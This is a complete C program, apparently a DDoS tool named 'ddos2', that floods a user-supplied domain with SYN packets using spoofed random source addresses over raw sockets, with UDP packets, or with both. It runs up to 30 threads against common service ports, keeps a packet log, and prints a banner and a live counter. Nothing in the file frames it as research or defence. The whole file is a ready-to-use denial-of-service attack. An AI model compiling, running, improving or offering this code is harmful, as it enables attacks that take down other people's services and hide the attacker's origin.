// gcc ddos2.c -o ddos2 -lpthread
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netdb.h>
#include <time.h>

#define MAX_THREADS 30
#define PACKET_SIZE 4096
#define LOGFILE "ddos.log"

//port target
int ports[] = {80, 443, 21, 22, 8080, 25, 3306, 53, 123};
int port_count = sizeof(ports) / sizeof(ports[0]);

unsigned long pkt_count = 0;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

FILE *log_file;

// logging ke file
void write_log(const char *mode, const char *ip, int port) {
    time_t now = time(NULL);
    struct tm *t = localtime(&now);
    fprintf(log_file, "[%02d:%02d:%02d] SENT %s to %s:%d\n",
            t->tm_hour, t->tm_min, t->tm_sec, mode, ip, port);
    fflush(log_file);
}

unsigned short csum(unsigned short *ptr, int nbytes) {
    long sum = 0;
    unsigned short oddbyte;
    short answer;

    while (nbytes > 1) { sum += *ptr++; nbytes -= 2; }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}
char* resolve_host(const char* host) {
    static char ip[INET_ADDRSTRLEN];
    struct addrinfo hints, *res;
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    
    if (getaddrinfo(host, NULL, &hints, &res) != 0) {
        fprintf(stderr, "[-] Gagal resolve: %s\n", host);
        exit(1);
    }

    struct sockaddr_in *addr = (struct sockaddr_in *)res->ai_addr;
    inet_ntop(AF_INET, &addr->sin_addr, ip, sizeof(ip));
    freeaddrinfo(res);
    return ip;
}

void banner(const char* ip, const char* mode) {
    printf("\033[1;32m");
    printf("╔══════════════════════════════════════╗\n");
    printf("║        fortis fortuna adiuvat        ║\n");
    printf("╚══════════════════════════════════════╝\n");
    printf("🎯 Target : %s\n", ip);
    printf("🎮 Mode   : %s\n", mode);
    printf("🧵 Threads: %d\n", MAX_THREADS);
    printf("📁 Log    : %s\n", LOGFILE);
    printf("🚀 Status : Running...\033[0m\n\n");
}

void *syn_flood(void *arg) {
    char *ip = (char *)arg;
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) pthread_exit(NULL);

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(ip);

    char datagram[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));

    while (1) {
        int port = ports[rand() % port_count];
        sin.sin_port = htons(port);

        memset(datagram, 0, PACKET_SIZE);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = rand();
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = rand();
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);

        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(port);
        tcph->seq = 0;
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(5840);
        tcph->check = 0;

        struct {
            u_int32_t src, dst;
            u_int8_t placeholder, protocol;
            u_int16_t length;
        } psh;

        psh.src = iph->saddr;
        psh.dst = iph->daddr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.length = htons(sizeof(struct tcphdr));

        char pseudo[1024];
        memcpy(pseudo, &psh, sizeof(psh));
        memcpy(pseudo + sizeof(psh), tcph, sizeof(struct tcphdr));
        tcph->check = csum((unsigned short*)pseudo, sizeof(psh) + sizeof(struct tcphdr));

        sendto(sock, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));

        pthread_mutex_lock(&lock);
        pkt_count++;
        write_log("SYN", ip, port);
        pthread_mutex_unlock(&lock);

        usleep(100);
    }
}

void *udp_flood(void *arg) {
    char *ip = (char *)arg;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) pthread_exit(NULL);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(ip);

    char data[PACKET_SIZE];
    memset(data, 'X', sizeof(data));

    while (1) {
        int port = ports[rand() % port_count];
        sin.sin_port = htons(port);
        sendto(sock, data, sizeof(data), 0, (struct sockaddr *)&sin, sizeof(sin));

        pthread_mutex_lock(&lock);
        pkt_count++;
        write_log("UDP", ip, port);
        pthread_mutex_unlock(&lock);

        usleep(100);
    }
}

void *monitor() {
    while (1) {
        sleep(1);
        pthread_mutex_lock(&lock);
        printf("\r\033[1;33m[~] Packets sent: %lu\033[0m", pkt_count);
        fflush(stdout);
        pthread_mutex_unlock(&lock);
    }
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <domain> <mode: syn|udp|all>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));
    char *ip = resolve_host(argv[1]);
    char *mode = argv[2];

    log_file = fopen(LOGFILE, "a");
    if (!log_file) {
        perror("Log file");
        return 1;
    }

    banner(ip, mode);

    pthread_t threads[MAX_THREADS], mon;
    pthread_create(&mon, NULL, monitor, NULL);

    int t = 0;
    for (int i = 0; i < MAX_THREADS / 2; i++) {
        if (strcmp(mode, "syn") == 0 || strcmp(mode, "all") == 0)
            pthread_create(&threads[t++], NULL, syn_flood, ip);
        if (strcmp(mode, "udp") == 0 || strcmp(mode, "all") == 0)
            pthread_create(&threads[t++], NULL, udp_flood, ip);
    }

    for (int i = 0; i < t; i++) pthread_join(threads[i], NULL);
    pthread_join(mon, NULL);
    fclose(log_file);
    return 0;
}
